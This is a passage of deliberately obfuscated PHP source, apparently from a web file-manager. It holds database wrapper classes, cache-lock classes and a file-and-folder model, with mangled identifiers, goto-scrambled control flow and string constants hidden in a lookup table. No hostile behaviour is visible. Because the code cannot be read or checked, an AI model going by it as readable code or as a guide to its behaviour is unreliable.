($cŸô‚¢à as $DÇß­ÈòÈ => $a™‡²˜˜) { $a™‡²˜˜ = array_change_key_case($a™‡²˜˜); $a™‡²˜˜[$eî¹‡ëà°ö[28]] = isset($a™‡²˜˜[$eî¹‡ëà°ö[28]]) ? $a™‡²˜˜[$eî¹‡ëà°ö[28]] : $eî¹‡ëà°ö[377]; $a™‡²˜˜[$eî¹‡ëà°ö[29]] = isset($a™‡²˜˜[$eî¹‡ëà°ö[29]]) ? $a™‡²˜˜[$eî¹‡ëà°ö[29]] : $eî¹‡ëà°ö[377]; $b“”·£œ°¨ = isset($a™‡²˜˜[$eî¹‡ëà°ö[276]]) ? $a™‡²˜˜[$eî¹‡ëà°ö[276]] : $a™‡²˜˜[$eî¹‡ëà°ö[28]]; $EŒâÜÏ§É´[$b“”·£œ°¨] = array($eî¹‡ëà°ö[28] => $b“”·£œ°¨, $eî¹‡ëà°ö[29] => $a™‡²˜˜[$eî¹‡ëà°ö[29]], $eî¹‡ëà°ö[31] => (bool) (isset($a™‡²˜˜[$eî¹‡ëà°ö[99]]) && $a™‡²˜˜[$eî¹‡ëà°ö[99]] === $eî¹‡ëà°ö[33] || isset($a™‡²˜˜[$eî¹‡ëà°ö[31]]) && $a™‡²˜˜[$eî¹‡ëà°ö[31]] === $eî¹‡ëà°ö[33]), $eî¹‡ëà°ö[34] => isset($a™‡²˜˜[$eî¹‡ëà°ö[34]]) ? $a™‡²˜˜[$eî¹‡ëà°ö[34]] : (isset($a™‡²˜˜[$eî¹‡ëà°ö[53]]) ? $a™‡²˜˜[$eî¹‡ëà°ö[53]] : $eî¹‡ëà°ö[377]), $eî¹‡ëà°ö[36] => isset($a™‡²˜˜[$eî¹‡ëà°ö[89]]) ? strtolower($a™‡²˜˜[$eî¹‡ëà°ö[89]]) == $eî¹‡ëà°ö[38] : (isset($a™‡²˜˜[$eî¹‡ëà°ö[54]]) ? $a™‡²˜˜[$eî¹‡ëà°ö[54]] : !1), $eî¹‡ëà°ö[39] => isset($a™‡²˜˜[$eî¹‡ëà°ö[886]]) ? strtolower($a™‡²˜˜[$eî¹‡ëà°ö[886]]) == $eî¹‡ëà°ö[41] : (isset($a™‡²˜˜[$eî¹‡ëà°ö[89]]) ? $a™‡²˜˜[$eî¹‡ëà°ö[89]] : !1)); } } goto Bì³–ŠÃˆë; FÀÁ¶Õë››: } public function getTables($d÷»Ôá³¿ = '') { $Dˆ·Ş¹¸¨¬ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (think_config($Dˆ·Ş¹¸¨¬[887])) { $F»ö˜ëé¯Š = str_replace($Dˆ·Ş¹¸¨¬[888], $d÷»Ôá³¿, think_config($Dˆ·Ş¹¸¨¬[887])); } else { switch ($this->dbType) { case $Dˆ·Ş¹¸¨¬[855]: case $Dˆ·Ş¹¸¨¬[857]: $F»ö˜ëé¯Š = $Dˆ·Ş¹¸¨¬[889]; break; case $Dˆ·Ş¹¸¨¬[854]: case $Dˆ·Ş¹¸¨¬[872]: $F»ö˜ëé¯Š = $Dˆ·Ş¹¸¨¬[890]; break; case $Dˆ·Ş¹¸¨¬[881]: $F»ö˜ëé¯Š = $Dˆ·Ş¹¸¨¬[891]; break; case $Dˆ·Ş¹¸¨¬[856]: think_exception(think_lang($Dˆ·Ş¹¸¨¬[892]) . $Dˆ·Ş¹¸¨¬[893]); break; case $Dˆ·Ş¹¸¨¬[873]: $F»ö˜ëé¯Š = $Dˆ·Ş¹¸¨¬[42] . $Dˆ·Ş¹¸¨¬[43] . $Dˆ·Ş¹¸¨¬[44]; break; case $Dˆ·Ş¹¸¨¬[884]: default: if (!empty($d÷»Ôá³¿)) { $F»ö˜ëé¯Š = $Dˆ·Ş¹¸¨¬[837] . $d÷»Ôá³¿ . $Dˆ·Ş¹¸¨¬[838]; } else { $F»ö˜ëé¯Š = $Dˆ·Ş¹¸¨¬[839]; } } } $a‹·¿¿‘Û = $this->query($F»ö˜ëé¯Š); $c†‘¶ÜÃ = array(); foreach ($a‹·¿¿‘Û as $AÙÏì‡®í => $c™©µ¯ãà) { $c†‘¶ÜÃ[$AÙÏì‡®í] = current($c™©µ¯ãà); } return $c†‘¶ÜÃ; } protected function parseLimit($d¶‚øœâÆ) { $c¸§•È‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F£¶¯å†Ûï = $c¸§•È‡[33]; if (!empty($d¶‚øœâÆ)) { switch ($this->dbType) { case $c¸§•È‡[881]: case $c¸§•È‡[873]: $d¶‚øœâÆ = explode($c¸§•È‡[47], $d¶‚øœâÆ); if (count($d¶‚øœâÆ) > 1) { $F£¶¯å†Ûï .= $c¸§•È‡[48] . $d¶‚øœâÆ[1] . $c¸§•È‡[49] . $d¶‚øœâÆ[0] . $c¸§•È‡[50]; } else { $F£¶¯å†Ûï .= $c¸§•È‡[48] . $d¶‚øœâÆ[0] . $c¸§•È‡[50]; } break; case $c¸§•È‡[854]: case $c¸§•È‡[872]: break; case $c¸§•È‡[856]: break; case $c¸§•È‡[855]: case $c¸§•È‡[857]: break; case $c¸§•È‡[884]: default: $F£¶¯å†Ûï .= $c¸§•È‡[48] . $d¶‚øœâÆ . $c¸§•È‡[50]; } } return $F£¶¯å†Ûï; } public function parseKey(&$dÄ±î¼Ï‡ğ, $b©»«¤ô = true) { $D…îÖÒˆ¨Õ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($b©»«¤ô) { $dÄ±î¼Ï‡ğ = $this->parseKeyCheck($dÄ±î¼Ï‡ğ); } if ($this->dbType == $D…îÖÒˆ¨Õ[884]) { if ($dÄ±î¼Ï‡ğ != $D…îÖÒˆ¨Õ[190] && !preg_match($D…îÖÒˆ¨Õ[849], $dÄ±î¼Ï‡ğ)) { $dÄ±î¼Ï‡ğ = $D…îÖÒˆ¨Õ[384] . trim($dÄ±î¼Ï‡ğ, $D…îÖÒˆ¨Õ[384]) . $D…îÖÒˆ¨Õ[384]; } return $dÄ±î¼Ï‡ğ; } else { return parent::parseKey($dÄ±î¼Ï‡ğ); } } public function close() { $this->_linkID = null; } public function error() { $Eñç•šÆ×Ã =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->PDOStatement) { $a¹‰®•„Ì = $this->PDOStatement->errorInfo(); $this->error = $a¹‰®•„Ì[1] . $Eñç•šÆ×Ã[4] . $a¹‰®•„Ì[2]; } else { $this->error = $Eñç•šÆ×Ã[33]; } if ($Eñç•šÆ×Ã[33] != $this->queryStr) { $this->error .= LNG($Eñç•šÆ×Ã[45]) . $this->queryStr; } think_trace($this->error, $Eñç•šÆ×Ã[33], $Eñç•šÆ×Ã[46]); return $this->error; } public function escapeString($Fìê¥¼ØÕ) { $cêªåÒŒ•¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; switch ($this->dbType) { case $cêªåÒŒ•¿[881]: case $cêªåÒŒ•¿[854]: case $cêªåÒŒ•¿[872]: case $cêªåÒŒ•¿[884]: return addslashes($Fìê¥¼ØÕ); case $cêªåÒŒ•¿[856]: case $cêªåÒŒ•¿[873]: case $cêªåÒŒ•¿[855]: case $cêªåÒŒ•¿[857]: return str_ireplace($cêªåÒŒ•¿[55], $cêªåÒŒ•¿[56], $Fìê¥¼ØÕ); } } protected function parseValue($a‘ˆö×Á‡“) { $aêÂ¨µ¹“È =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_string($a‘ˆö×Á‡“)) { $a‘ˆö×Á‡“ = strpos($a‘ˆö×Á‡“, $aêÂ¨µ¹“È[4]) === 0 ? $this->escapeString($a‘ˆö×Á‡“) : $aêÂ¨µ¹“È[894] . $this->escapeString($a‘ˆö×Á‡“) . $aêÂ¨µ¹“È[894]; } elseif (isset($a‘ˆö×Á‡“[0]) && is_string($a‘ˆö×Á‡“[0]) && strtolower($a‘ˆö×Á‡“[0]) == $aêÂ¨µ¹“È[300]) { $a‘ˆö×Á‡“ = $this->escapeString($a‘ˆö×Á‡“[1]); } elseif (is_array($a‘ˆö×Á‡“)) { $a‘ˆö×Á‡“ = array_map(array($this, $aêÂ¨µ¹“È[895]), $a‘ˆö×Á‡“); } elseif (is_bool($a‘ˆö×Á‡“)) { $a‘ˆö×Á‡“ = $a‘ˆö×Á‡“ ? $aêÂ¨µ¹“È[83] : $aêÂ¨µ¹“È[494]; } elseif (is_null($a‘ˆö×Á‡“)) { $a‘ˆö×Á‡“ = $aêÂ¨µ¹“È[99]; } return $a‘ˆö×Á‡“; } public function getLastInsertId() { $f»ˆô—ÖÓ« =& $_SERVER[åÌÛ»ô¢‚ö™]; switch ($this->dbType) { case $f»ˆô—ÖÓ«[881]: case $f»ˆô—ÖÓ«[873]: case $f»ˆô—ÖÓ«[854]: case $f»ˆô—ÖÓ«[872]: case $f»ˆô—ÖÓ«[856]: case $f»ˆô—ÖÓ«[884]: return $this->_linkID->lastInsertId(); case $f»ˆô—ÖÓ«[855]: case $f»ˆô—ÖÓ«[857]: $A½§›«ˆÊƒ = $this->table; $a‚»˜¬¤ª‹ = $this->query("\123\105\x4c\105\103\x54\x20{$A½§›«ˆÊƒ}\56\x63\165\162\x72\166\141\x6c\40\x63\165\162\162\x76\141\x6c\x20\x46\x52\x4f\115\x20\x64\x75\x61\154"); return $a‚»˜¬¤ª‹ ? $a‚»˜¬¤ª‹[0][$f»ˆô—ÖÓ«[896]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($FôÓ—‹Šô) { $Eå…ó—è¥¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!CacheLock::fileLock($Eå…ó—è¥¤[9])) { return !1; } $F‰ôòãÎì˜ = parent::query($FôÓ—‹Šô); CacheLock::fileUnLock($Eå…ó—è¥¤[9]); return $F‰ôòãÎì˜; } public function execute($Aø¡ØÅÅ§­) { $A«İ²à‹ğ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!CacheLock::fileLock($A«İ²à‹ğ[9])) { return !1; } $F“…Ş£Ù“ = parent::execute($Aø¡ØÅÅ§­); CacheLock::fileUnLock($A«İ²à‹ğ[9]); return $F“…Ş£Ù“; } } class DbSqlite3 extends DbSqlite3Base { public function query($BÍ”¬—ÔÊ¼) { $aêùÉåá¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!CacheLock::fileLock($aêùÉåá¤[9])) { return !1; } $e´ÄõìÔÀ– = parent::query($BÍ”¬—ÔÊ¼); CacheLock::fileUnLock($aêùÉåá¤[9]); return $e´ÄõìÔÀ–; } public function execute($C“§Û÷“”â) { $CÀÙ†íØË® =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!CacheLock::fileLock($CÀÙ†íØË®[9])) { return !1; } $CÁ¯×¼Ã¨Ø = parent::execute($C“§Û÷“”â); CacheLock::fileUnLock($CÀÙ†íØË®[9]); return $CÁ¯×¼Ã¨Ø; } } goto béÌÊÌç£; FÃëö´’Ÿ³: class CacheLockRedis { public function lock($A¬íß¬÷¥ğ, $eŠ¨£¨ö‡« = 10) { $C×¿ˆ†éôñ = Cache::init(); $E¶ßô¥‡¯À = microtime(!0) + $eŠ¨£¨ö‡«; while (microtime(!0) < $E¶ßô¥‡¯À) { $F ¬Œãˆ¹Í = $C×¿ˆ†éôñ->get($A¬íß¬÷¥ğ); if (!$F ¬Œãˆ¹Í) { $D ¼´Æ—±µ = $C×¿ˆ†éôñ->setLock($A¬íß¬÷¥ğ, $E¶ßô¥‡¯À, $eŠ¨£¨ö‡«); if ($D ¼´Æ—±µ) { return !0; } } else { if ($F ¬Œãˆ¹Í < microtime(!0)) { $C×¿ˆ†éôñ->set($A¬íß¬÷¥ğ, $E¶ßô¥‡¯À, $E¶ßô¥‡¯À); if ($C×¿ˆ†éôñ->get($A¬íß¬÷¥ğ) === $F ¬Œãˆ¹Í) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($bÑÑÂ†ÙÅ) { return Cache::init()->get($bÑÑÂ†ÙÅ); } public function unlock($fÑ‡Ô’Š¬ç) { return Cache::init()->remove($fÑ‡Ô’Š¬ç); } } class CacheLockMemcached { public function lock($cà¨—¾¬–“, $AÙÖÚ›—…İ = 0) { $bì¥«Üò = Cache::init(); $a‰‡ÍÀØ‡ = microtime(!0) + $AÙÖÚ›—…İ; while (microtime(!0) < $a‰‡ÍÀØ‡) { $EÜ†ù¯ = $bì¥«Üò->get($cà¨—¾¬–“); if (!$EÜ†ù¯ || $EÜ†ù¯ < microtime(!0)) { $c¾»ìÅ¾—¢ = $bì¥«Üò->handle->add($cà¨—¾¬–“, $a‰‡ÍÀØ‡, $AÙÖÚ›—…İ); if ($c¾»ìÅ¾—¢) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($CÅ¯ë‚ìÀ†) { return Cache::init()->get($CÅ¯ë‚ìÀ†); } public function unlock($E¼Ëù®…«è) { return Cache::init()->remove($E¼Ëù®…«è); } } class CacheLockDatabase { public function lock($C«º¬¾À«, $dñ†ë„äÒ = 0) { $FÌ…ˆùŒ¨ô = Model($_SERVER[åÌÛ»ô¢‚ö™][782]); $cÔ¡ŞÍéïó = microtime(!0) + $dñ†ë„äÒ; while (microtime(!0) < $cÔ¡ŞÍéïó) { $fëìå˜İÍ = $FÌ…ˆùŒ¨ô->get($C«º¬¾À«); if (!$fëìå˜İÍ || $fëìå˜İÍ < microtime(!0)) { $AÏ‰æ’¬ˆ¥ = $FÌ…ˆùŒ¨ô->set($C«º¬¾À«, $cÔ¡ŞÍéïó); if ($AÏ‰æ’¬ˆ¥) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($b¾Ô—š™ç¹) { return Model($_SERVER[åÌÛ»ô¢‚ö™][782])->get($b¾Ô—š™ç¹); } public function unlock($C»ÕÓ‘Áñç) { Model($_SERVER[åÌÛ»ô¢‚ö™][782])->remove($C»ÕÓ‘Áñç); } } goto Aìó½à¤æÕ; E‡ùÇÏˆ¶©: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($bÛøâ¦è) { $C®ö§¨Ñğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÖ‹ÜŒğàÚ = Model($C®ö§¨Ñğ[500])->where(array($C®ö§¨Ñğ[1457] => $bÛøâ¦è))->find(); $bÉæŸ…‹¨ = $this->_mkdirRoot(SourceModel::TYPE_USER, $bÛøâ¦è, $eÖ‹ÜŒğàÚ[$C®ö§¨Ñğ[28]]); $this->userDesktopAdd($bÉæŸ…‹¨); return $bÉæŸ…‹¨; } public function userDesktopAdd($cø‚Û°æ ‡) { $c†ˆíÖ÷õ™ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÇ¹“”âô´ = LNG($c†ˆíÖ÷õ™[2391]); $F¥Ï±™– = $this->mkdir($cø‚Û°æ ‡, $bÇ¹“”âô´); $this->metaSet($F¥Ï±™–, $c†ˆíÖ÷õ™[2392], $c†ˆíÖ÷õ™[83]); $this->metaSet($cø‚Û°æ ‡, $c†ˆíÖ÷õ™[2393], $F¥Ï±™–); } public function groupRootAdd($f›ÚÁß±ğ) { $BÅ†©³œ· =& $_SERVER[åÌÛ»ô¢‚ö™]; $d³ŞÈìŠÒê = Model($BÅ†©³œ·[484])->where(array($BÅ†©³œ·[2215] => $f›ÚÁß±ğ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $f›ÚÁß±ğ, $d³ŞÈìŠÒê[$BÅ†©³œ·[28]]); } public function systemRootPathAdd($EšÊ©×ª) { if ($EšÊ©×ª != $_SERVER[åÌÛ»ô¢‚ö™][1115]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $EšÊ©×ª); } public function userRootRemove($f¿›ê‡¤ò) { $bîõÌ¦ùº = $this->sourceRoot(SourceModel::TYPE_USER, $f¿›ê‡¤ò); if (!$bîõÌ¦ùº) { return; } $this->remove($bîõÌ¦ùº, !1); } public function groupRootRemove($dï®èÏÓÇ³) { $EŞ¥ö£„ï² = $this->sourceRoot(SourceModel::TYPE_GROUP, $dï®èÏÓÇ³); if (!$EŞ¥ö£„ï²) { return; } $this->remove($EŞ¥ö£„ï², !1); } private function _mkdirRoot($d‚Ë£ Øï, $fÁ„Õ½§¦, $eŒøœ´ñƒ¾) { goto dï‚ŠÖÈâ¼; dï‚ŠÖÈâ¼: $F¬Õ¦Åä =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÃÎÖçø«Å = array($F¬Õ¦Åä[393] => 0, $F¬Õ¦Åä[547] => $d‚Ë£ Øï, $F¬Õ¦Åä[548] => $fÁ„Õ½§¦, $F¬Õ¦Åä[544] => 1, $F¬Õ¦Åä[549] => USER_ID, $F¬Õ¦Åä[550] => USER_ID, $F¬Õ¦Åä[545] => $F¬Õ¦Åä[33], $F¬Õ¦Åä[551] => $F¬Õ¦Åä[496], $F¬Õ¦Åä[421] => 0, $F¬Õ¦Åä[546] => 0, $F¬Õ¦Åä[445] => 0, $F¬Õ¦Åä[552] => $F¬Õ¦Åä[33]); if ($CŠ¹©´ôÇ = $this->where($FÃÎÖçø«Å)->find()) { return $CŠ¹©´ôÇ[$F¬Õ¦Åä[394]]; } goto f‡Ê‹æÆ„; eà»÷ËŒÉö: CacheLock::unlock($f†ÔÍÓÁë£); return $c¹éÉì½; goto bŒôÛä¬; Aõ³™šì©½: $c¹éÉì½ = $this->add($FÃÎÖçø«Å); $bäÃòÌøõ‡ = array($F¬Õ¦Åä[553] => short_id($c¹éÉì½)); $this->where(array($F¬Õ¦Åä[408] => $c¹éÉì½))->save($bäÃòÌøõ‡); goto eà»÷ËŒÉö; f‡Ê‹æÆ„: $f†ÔÍÓÁë£ = "\115\157\x64\x65\x6c\x53\157\165\162\x63\x65\56\155\153\144\x69\x72\x52\x6f\x6f\x74\56{$d‚Ë£ Øï}\x2e{$fÁ„Õ½§¦}\x2e" . $eŒøœ´ñƒ¾; CacheLock::lock($f†ÔÍÓÁë£); $FÃÎÖçø«Å[$F¬Õ¦Åä[28]] = $eŒøœ´ñƒ¾; goto Aõ³™šì©½; bŒôÛä¬: } private function sourceRoot($D¥âô˜ÜÖ, $dçÙï«‰Úî, $FÎ—Äõ•‡ó = false) { $FÑ¿¢óí¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DœøóŠÄ­ = array($FÑ¿¢óí¢[393] => 0, $FÑ¿¢óí¢[547] => $D¥âô˜ÜÖ, $FÑ¿¢óí¢[548] => $dçÙï«‰Úî); if ($D„Ã÷‡ƒ = $this->where($DœøóŠÄ­)->find()) { return $FÎ—Äõ•‡ó ? $D„Ã÷‡ƒ : $D„Ã÷‡ƒ[$FÑ¿¢óí¢[394]]; } return !1; } public function sourceRootGroup($e±Œ‚ÛÜ) { $E¤°Òø =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_string($e±Œ‚ÛÜ)) { $e±Œ‚ÛÜ = array($e±Œ‚ÛÜ); } $EÓ ³¤©÷Ë = array($E¤°Òø[393] => 0, $E¤°Òø[547] => SourceModel::TYPE_GROUP, $E¤°Òø[548] => array($E¤°Òø[7], $e±Œ‚ÛÜ)); $FŠËÏí½ˆå = $this->listSource($EÓ ³¤©÷Ë, 1000); return array_to_keyvalue($FŠËÏí½ˆå[$E¤°Òø[74]], $E¤°Òø[482]); } public function mkfile($aÅ¦ÌÓ«, $EÊéƒ‚åÓ„, $a§íÈ°‰ = '', $Cæº°Â¢ = REPEAT_RENAME) { $Fà¢Ñ‚…¢“ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A†ğÆÓ®Êõ = Model($Fà¢Ñ‚…¢“[569])->addFileByContent($a§íÈ°‰, $EÊéƒ‚åÓ„); return $this->_createFileCall($aÅ¦ÌÓ«, $EÊéƒ‚åÓ„, $A†ğÆÓ®Êõ, $Cæº°Â¢, $Fà¢Ñ‚…¢“[1152]); } public function addFile($B‹ğà†“«, $aÛ§ï›„¥, $CÓé­à­Áİ, $AŞ±ªöÜ = false, $aÏ§Ôƒ”Ë = REPEAT_RENAME) { $d¬Ùµé‹ØÛ = Model($_SERVER[åÌÛ»ô¢‚ö™][569])->addFile($aÛ§ï›„¥, $CÓé­à­Áİ, $AŞ±ªöÜ); return $this->_createFileCall($B‹ğà†“«, $CÓé­à­Áİ, $d¬Ùµé‹ØÛ, $aÏ§Ôƒ”Ë); } public function addFileByFileID($Añ¥òöÄé, $bö…½˜ÄŸ, $cÉ¸Ğ­½, $F‡¿‚•è¦© = REPEAT_RENAME) { $dí¡¬‡¹¾ö =& $_SERVER[åÌÛ»ô¢‚ö™]; $DƒĞàëæ¨Ï = Model($dí¡¬‡¹¾ö[569])->find($bö…½˜ÄŸ); Model($dí¡¬‡¹¾ö[569])->linkAdd($bö…½˜ÄŸ); return $this->_createFileCall($Añ¥òöÄé, $cÉ¸Ğ­½, $DƒĞàëæ¨Ï, $F‡¿‚•è¦©); } public function addFileByRemote($Eá²Å•Øë, $B‹é‹ì¼Ë, $F¸†¿°‹É, $C„ÌŒµ¾¬Ñ = array(), $dÒù¬Ñáã¥ = REPEAT_RENAME) { $CËØí…†œ = Model($_SERVER[åÌÛ»ô¢‚ö™][569])->addFileByRemote($B‹é‹ì¼Ë, $F¸†¿°‹É, $C„ÌŒµ¾¬Ñ); return $this->_createFileCall($Eá²Å•Øë, $F¸†¿°‹É, $CËØí…†œ, $dÒù¬Ñáã¥); } private function _createFileCall($eí½àÊÉ½, $A­‰ ‰Š¡Õ, $fó‰Æ¥Ä÷, $Cì­É´¢¦Á, $DÇÂ‚»Èµ¸ = "\165\160\x6c\x6f\141\x64") { goto AÁÎçâôĞŒ; AÁÎçâôĞŒ: $bêôö˜¼øÆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eˆ©„ëù = !1; $this->lockWriteStart($eí½àÊÉ½, $A­‰ ‰Š¡Õ); goto E» ó©ÔÕÔ; fÇª„æá¾Ø: return $cÄÔ´Ú”ù“; goto CÅí•ÌÂ‚; E» ó©ÔÕÔ: $cÄÔ´Ú”ù“ = $this->_createFile($eí½àÊÉ½, $A­‰ ‰Š¡Õ, $fó‰Æ¥Ä÷, $Cì­É´¢¦Á, $eˆ©„ëù); if (!$eˆ©„ëù) { Model($bêôö˜¼øÆ[447])->remove($fó‰Æ¥Ä÷[$bêôö˜¼øÆ[444]]); } else { if ($cÄÔ´Ú”ù“) { Model($bêôö˜¼øÆ[2363])->eventCreate($cÄÔ´Ú”ù“, $DÇÂ‚»Èµ¸); } } $this->lockWriteEnd($eí½àÊÉ½, $A­‰ ‰Š¡Õ); goto fÇª„æá¾Ø; CÅí•ÌÂ‚: } public function mkdir($a½ÒÛ«‡¦ğ, $cîùµ…ˆ“Î, $bòâ‘ÂƒÇ¢ = REPEAT_SKIP) { goto b¡Ïíí©Úê; fç¨Œà—È: $B¬’”©´î£ = $this->_addSoure($DÂØà¸ÙŠ¯, $A Ûé³„©); Model($bíÓºìğÌ[2363])->eventCreate($B¬’”©´î£, $bíÓºìğÌ[1153]); $this->lockWriteEnd($a½ÒÛ«‡¦ğ, $cîùµ…ˆ“Î); goto B¥±äêÅ†; b¡Ïíí©Úê: $bíÓºìğÌ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A Ûé³„© = $this->sourceInfo($a½ÒÛ«‡¦ğ); if (!$A Ûé³„©) { return !1; } goto b„ÕŞŠâ÷æ; B¥±äêÅ†: return $B¬’”©´î£; goto bëÊçö“òØ; b„ÕŞŠâ÷æ: $this->lockWriteStart($a½ÒÛ«‡¦ğ, $cîùµ…ˆ“Î); if ($bòâ‘ÂƒÇ¢ !== !1) { $AÙ¡½²“– = $this->fileNameExist($a½ÒÛ«‡¦ğ, $cîùµ…ˆ“Î); if ($AÙ¡½²“– && $bòâ‘ÂƒÇ¢ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a½ÒÛ«‡¦ğ, $cîùµ…ˆ“Î); return $AÙ¡½²“–; } $cîùµ…ˆ“Î = $this->fileNameAuto($a½ÒÛ«‡¦ğ, $cîùµ…ˆ“Î, $bòâ‘ÂƒÇ¢); } $DÂØà¸ÙŠ¯ = array($bíÓºìğÌ[544] => 1, $bíÓºìğÌ[411] => $cîùµ…ˆ“Î, $bíÓºìğÌ[545] => $bíÓºìğÌ[33], $bíÓºìğÌ[445] => 0, $bíÓºìğÌ[546] => 0); goto fç¨Œà—È; bëÊçö“òØ: } private function _createFile($cÁÓÈ¤‹ö£, $D¢õõÃÍ, $CÓ‡íØ’Áï, $bÑ‚ŒÖê¿à, &$f¤Å¯¯Ğò†) { goto fãÀ¦¼¸Á; D»°Ÿ’Éù¯: return $DÂæ“‚®²…; goto e ì˜êÒ‹é; a‹ï˜ëƒÅ»: $f¹Å¥†² = array($dŞèÀƒë™[544] => 0, $dŞèÀƒë™[411] => $D¢õõÃÍ, $dŞèÀƒë™[545] => get_path_ext($D¢õõÃÍ), $dŞèÀƒë™[445] => $CÓ‡íØ’Áï[$dŞèÀƒë™[444]], $dŞèÀƒë™[546] => $CÓ‡íØ’Áï[$dŞèÀƒë™[77]]); $DÂæ“‚®²… = $this->_addSoure($f¹Å¥†², $Aíµƒç¬Óğ); $this->folderSizeReset($cÁÓÈ¤‹ö£); goto D»°Ÿ’Éù¯; f½åŒÅºÆÆ: if ($bÑ‚ŒÖê¿à !== !1) { $B‰´„í‘ì¶ = $this->fileNameExist($cÁÓÈ¤‹ö£, $D¢õõÃÍ); } $f¤Å¯¯Ğò† = !0; if ($bÑ‚ŒÖê¿à && $B‰´„í‘ì¶) { if ($bÑ‚ŒÖê¿à == REPEAT_SKIP) { $f¤Å¯¯Ğò† = !1; return $B‰´„í‘ì¶; } else { if ($bÑ‚ŒÖê¿à == REPEAT_REPLACE) { $cƒÙ¨¶®®Ô = $this->sourceInfo($B‰´„í‘ì¶); $Eâ£¬…Ò²Î = $this->fileHistory($cƒÙ¨¶®®Ô, $CÓ‡íØ’Áï[$dŞèÀƒë™[444]], $CÓ‡íØ’Áï[$dŞèÀƒë™[77]]); if (!$Eâ£¬…Ò²Î) { $f¤Å¯¯Ğò† = !1; } else { $this->folderSizeReset($cÁÓÈ¤‹ö£); } return $B‰´„í‘ì¶; } else { $D¢õõÃÍ = $this->fileNameAuto($cÁÓÈ¤‹ö£, $D¢õõÃÍ, $bÑ‚ŒÖê¿à, !1); } } } goto a‹ï˜ëƒÅ»; fãÀ¦¼¸Á: $dŞèÀƒë™ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aíµƒç¬Óğ = $this->sourceInfo($cÁÓÈ¤‹ö£); if (!$CÓ‡íØ’Áï || !$Aíµƒç¬Óğ) { return !1; } goto f½åŒÅºÆÆ; e ì˜êÒ‹é: } protected function fileHistory($fùÙîáåˆÜ, $BÚ‘œãÏ±«, $còÉ‘ßìäè) { goto dØ¹ç¤Ê¿; dØ¹ç¤Ê¿: $dÑ…óˆŒ¾  =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($fùÙîáåˆÜ[$dÑ…óˆŒ¾ [444]] == $BÚ‘œãÏ±«) { return !1; } $this->checkLock($fùÙîáåˆÜ[$dÑ…óˆŒ¾ [394]], $BÚ‘œãÏ±«); goto EöÚ‚›Áëí; EöÚ‚›Áëí: Model($dÑ…óˆŒ¾ [2394])->addHistory($fùÙîáåˆÜ); $Fä‹¾õ•ƒè = array($dÑ…óˆŒ¾ [550] => USER_ID, $dÑ…óˆŒ¾ [415] => time(), $dÑ…óˆŒ¾ [444] => $BÚ‘œãÏ±«, $dÑ…óˆŒ¾ [77] => $còÉ‘ßìäè); $this->where(array($dÑ…óˆŒ¾ [408] => $fùÙîáåˆÜ[$dÑ…óˆŒ¾ [394]]))->save($Fä‹¾õ•ƒè); goto Fˆ‡¨®¼™; Fˆ‡¨®¼™: return !0; goto fÊÏµ‘ğ»â; fÊÏµ‘ğ»â: } public function checkLock($fÛì†å–øŠ, $CæÆ¥—ƒ»ä) { goto c¤Á˜é‹; c¤Á˜é‹: $CèšŞã‡šë =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¡ŠåÖÔ£‰ = $this->pathInfo($fÛì†å–øŠ); if (!$this->fileIsLock($e¡ŠåÖÔ£‰, !0)) { return; } goto b‚²çñß¶´; b”œã¿Òø¡: show_json(LNG($CèšŞã‡šë[2397]) . $CèšŞã‡šë[2398] . LNG($CèšŞã‡šë[2399]) . $CèšŞã‡šë[2400] . $D‹î¬¯·”ñ . $CèšŞã‡šë[2401], !1); goto E’×¿¡á¹ë; fßŞƒ–Æİñ: $this->_createFileCall($e¡ŠåÖÔ£‰[$CèšŞã‡šë[487]], $dÛŒÜÓä, $DçÄ‚Ñ¡â‰, REPEAT_REPLACE, $CèšŞã‡šë[1152]); $bæ±ÜÒÌÊ™ = $e¡ŠåÖÔ£‰[$CèšŞã‡šë[442]][$CèšŞã‡šë[507]]; $D‹î¬¯·”ñ = $bæ±ÜÒÌÊ™[$CèšŞã‡šë[2396]] ? $bæ±ÜÒÌÊ™[$CèšŞã‡šë[2396]] : $bæ±ÜÒÌÊ™[$CèšŞã‡šë[28]]; goto b”œã¿Òø¡; b‚²çñß¶´: $A‰‹’¸’…„ = Session::get($CèšŞã‡šë[2395]); $dÛŒÜÓä = substr($e¡ŠåÖÔ£‰[$CèšŞã‡šë[28]], 0, -1 - strlen($e¡ŠåÖÔ£‰[$CèšŞã‡šë[165]])) . $CèšŞã‡šë[1417] . $A‰‹’¸’…„ . $CèšŞã‡šë[91] . $e¡ŠåÖÔ£‰[$CèšŞã‡šë[165]]; $DçÄ‚Ñ¡â‰ = Model($CèšŞã‡šë[569])->find($CæÆ¥—ƒ»ä); goto fßŞƒ–Æİñ; E’×¿¡á¹ë: } public function fileIsLock($cËéÃ°¨æô, $AÌÛÒ«œİ = false) { goto C†©‹ç—‹¼; e¥ËÎç•Ã: $DÀê»Ñó¥ƒ = 